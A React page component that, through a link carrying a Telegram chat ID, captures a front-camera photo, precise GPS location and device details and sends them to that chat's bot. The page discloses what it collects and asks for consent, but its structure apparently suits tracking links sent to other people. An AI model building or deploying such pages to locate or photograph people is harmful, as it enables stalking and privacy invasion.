import { useState, useEffect } from 'react';
import { useSubmitCapture } from '@workspace/api-client-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import { ShieldCheck, Camera, MapPin, Smartphone, Loader2, CheckCircle, AlertCircle, AlertTriangle } from 'lucide-react';

type Step = 'idle' | 'camera' | 'location' | 'device' | 'sending' | 'success';

export default function Home() {
  const [step, setStep] = useState<Step>('idle');
  const [error, setError] = useState<string | null>(null);
  const [chatId, setChatId] = useState<string | null>(null);

  const submitCapture = useSubmitCapture();

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('chat_id');
    if (id) {
      setChatId(id);
    }
  }, []);

  const handleCapture = async () => {
    if (!chatId) return;
    setError(null);

    try {
      setStep('camera');
      
      // Request Camera
      let stream: MediaStream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      } catch (err) {
        throw new Error("Camera permission was denied. We cannot proceed without camera access.");
      }

      const video = document.createElement("video");
      video.setAttribute("playsinline", "true");
      video.srcObject = stream;
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve(true);
        };
      });

      // Wait a moment for exposure to adjust
      await new Promise(r => setTimeout(r, 600));

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      
      if (!ctx) throw new Error("Failed to create image context.");
      
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photo = canvas.toDataURL("image/jpeg", 0.7);
      
      stream.getTracks().forEach(track => track.stop());

      // Request Location
      setStep('location');
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { 
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      }).catch((err) => {
        throw new Error("Location permission was denied. We cannot proceed without location access.");
      });

      const location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
      };

      // Gather Device Info
      setStep('device');
      let battery = null;
      if ('getBattery' in navigator) {
        try {
           const bat = await (navigator as any).getBattery();
           battery = Math.round(bat.level * 100);
        } catch(e) {}
      }
      const connectionType = (navigator as any).connection?.effectiveType || null;
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery,
        connectionType
      };

      // Submit Data
      setStep('sending');
      submitCapture.mutate({
        data: {
          chatId,
          photo,
          location,
          deviceInfo
        }
      }, {
        onSuccess: () => {
          setStep('success');
        },
        onError: (err) => {
          setError(err.message || "Failed to send data to the server. Please try again.");
          setStep('idle');
        }
      });

    } catch (err: any) {
      setError(err.message || "An error occurred during capture. Please check your permissions.");
      setStep('idle');
    }
  };

  if (!chatId) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full">
          <CardHeader>
            <div className="w-12 h-12 rounded-full bg-destructive/10 text-destructive flex items-center justify-center mx-auto mb-4">
              <AlertTriangle className="w-6 h-6" />
            </div>
            <CardTitle>Invalid Link</CardTitle>
            <CardDescription>
              We couldn't identify the destination for your data.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center text-sm text-muted-foreground pb-8">
            Please make sure you clicked the exact link provided by the Telegram bot. Missing chat ID.
          </CardContent>
        </Card>
      </div>
    );
  }

  if (step === 'success') {
    return (
      <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full border-green-100 shadow-2xl shadow-green-900/5">
          <CardHeader className="pt-10">
            <div className="w-20 h-20 rounded-full bg-green-50 text-green-600 flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-10 h-10" />
            </div>
            <CardTitle className="text-2xl text-green-950">Aapki jaankari bot ko bhej di gayi hai!</CardTitle>
            <CardDescription className="text-base mt-2">
              Your information has been successfully sent to the Telegram bot.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center pb-10">
            <p className="text-sm text-muted-foreground">
              You can now safely close this page and return to Telegram.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  const isProcessing = step !== 'idle';

  return (
    <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 py-12 bg-background bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-blue-50/50 via-background to-background">
      <Card className="max-w-md w-full relative z-10 border-slate-200">
        <CardHeader className="pb-4">
          <div className="w-16 h-16 rounded-2xl bg-blue-50 text-primary flex items-center justify-center mx-auto mb-6 shadow-sm border border-blue-100">
            <ShieldCheck className="w-8 h-8" />
          </div>
          <CardTitle className="text-slate-900 tracking-tight text-[22px]">
            Data Sharing Permission
          </CardTitle>
          <CardDescription className="text-base text-slate-600 leading-relaxed mt-2 font-medium">
            Aapki yeh jaankari Telegram bot ko bheji jaayegi. We need your consent to proceed.
          </CardDescription>
        </CardHeader>
        
        <CardContent className="space-y-6">
          {error && (
            <div className="p-4 rounded-xl bg-red-50 border border-red-100 flex items-start gap-3 text-red-800 animate-in fade-in slide-in-from-top-2">
              <AlertCircle className="w-5 h-5 shrink-0 mt-0.5 text-red-600" />
              <p className="text-sm font-medium leading-tight">{error}</p>
            </div>
          )}

          <div className="space-y-4">
            <h3 className="text-sm font-bold text-slate-900 uppercase tracking-wider">What will be shared</h3>
            
            <div className="grid gap-3">
              <div className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
                  <Camera className="w-5 h-5 text-slate-700" />
                </div>
                <div>
                  <h4 className="text-sm font-semibold text-slate-900">Camera Photo</h4>
                  <p className="text-xs text-slate-500 mt-0.5">A single photo taken from your front camera.</p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
                  <MapPin className="w-5 h-5 text-slate-700" />
                </div>
                <div>
                  <h4 className="text-sm font-semibold text-slate-900">Precise Location</h4>
                  <p className="text-xs text-slate-500 mt-0.5">Your exact GPS coordinates (latitude and longitude).</p>
                </div>
              </div>

              <div className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
                  <Smartphone className="w-5 h-5 text-slate-700" />
                </div>
                <div>
                  <h4 className="text-sm font-semibold text-slate-900">Device Information</h4>
                  <p className="text-xs text-slate-500 mt-0.5">Model, browser, screen size, language, timezone, and battery level.</p>
                </div>
              </div>
            </div>
          </div>
        </CardContent>

        <CardFooter className="flex-col gap-3 pb-8">
          <Button 
            className="w-full h-14 text-base font-bold shadow-blue-900/10 shadow-lg" 
            onClick={handleCapture}
            disabled={isProcessing}
            data-testid="button-allow-share"
          >
            {isProcessing ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin mr-2" />
                {step === 'camera' && "Capturing photo..."}
                {step === 'location' && "Getting location..."}
                {step === 'device' && "Reading device info..."}
                {step === 'sending' && "Sending to bot..."}
              </>
            ) : (
              "Allow & Share Data"
            )}
          </Button>
          <p className="text-xs text-center text-slate-500 px-4">
            By clicking allow, you agree to securely share this information with the requested bot.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
}
